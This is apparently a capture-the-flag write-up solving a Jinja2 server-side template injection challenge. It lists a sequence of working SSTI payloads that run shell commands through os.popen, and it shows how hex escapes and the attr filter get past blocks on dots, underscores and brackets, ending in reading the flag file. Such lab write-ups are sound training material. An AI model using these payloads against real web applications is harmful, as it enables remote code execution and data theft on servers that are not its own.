# Recon
## Overview of the target
- A basic html site without any css at all
- having an input field
<img width="1440" height="233" alt="Screenshot_2025-09-09_23-26-57" src="https://github.com/user-attachments/assets/63d307ff-8d7a-439c-bd0c-c7548e99bf1d" />
<img width="1920" height="384" alt="Screenshot_2025-09-10_19-19-48" src="https://github.com/user-attachments/assets/a44bcb75-c9de-4280-96c1-5a4465d23a2a" />

The title of the challenge gives me a hint to find server template injection which I came across this [source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#inject-template-syntax) (PayloadsAllTheThings, Github)
<img width="768" height="464" alt="Screenshot_2025-09-10_19-22-37" src="https://github.com/user-attachments/assets/b2286994-e2e2-4068-8b86-7fd718f55fe3" />
Then I tried this payload 
<img width="773" height="227" alt="Screenshot_2025-09-10_19-32-46" src="https://github.com/user-attachments/assets/7970caf9-86ff-41f7-8133-f6eac3556dc7" />
and it worked
<img width="1920" height="279" alt="Screenshot_2025-09-10_19-32-55" src="https://github.com/user-attachments/assets/152e69a9-0a3d-4b48-a578-ed32279948b5" />
Then I deducted that this site use Jinja2 server template -> My mission is to find payloads for this template
I came across this [source](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) for the payloads
- {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} ->block "." then:
- {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}} -> block “.” and “_” then:
- {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}} -> block .”, “_”, “[]” and “|join” then using this to bypass all :
- {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} -> worked!!!
<img width="1920" height="395" alt="Screenshot_2025-09-10_19-42-43" src="https://github.com/user-attachments/assets/dee05cd4-f607-4294-a430-53de8f537d32" />
So I just needed to modify 'id' into 'ls' to know the name of the file containing the flag
<img width="1920" height="437" alt="Screenshot_2025-09-10_21-26-11" src="https://github.com/user-attachments/assets/0eab31c9-3382-45f4-9dcf-7820bf517afa" />
so again modifying the key word 'ls' int 'cat flag' then we got the flag

# Reference
“Server Side Template Injection with Jinja2 - OnSecurity.” OnSecurity, 27 Aug. 2025, onsecurity.io/article/server-side-template-injection-with-jinja2/. Accessed 10 Sept. 2025.

swisskyrepo. “PayloadsAllTheThings/Server Side Template Injection at Master · Swisskyrepo/PayloadsAllTheThings.” GitHub, 2016, github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#inject-template-syntax. Accessed 10 Sept. 2025.
